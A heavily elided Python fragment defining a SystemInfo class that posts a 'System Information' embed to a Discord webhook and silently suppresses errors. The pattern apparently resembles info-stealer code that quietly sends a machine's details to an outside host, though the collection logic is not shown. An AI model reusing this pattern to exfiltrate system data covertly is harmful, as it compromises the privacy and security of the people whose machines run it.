...
class SystemInfo():
    def __init__(self, webhook: str) -> None:
        ...
        embed = Embed(title="System Information", color=5763719)
        ...
        try:
            webhook.send(
                ...
                avatar_url="https://images-ext-1.discordapp.net/external/pu5CNdNZ_teS81q1zOwLBLHH1QpwJcU_vLRun8iAK5s/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/915995314790481982/a_63667cf6eb7a59c81dfaa939ac3b04ed.gif"
            )
        except:
            pass
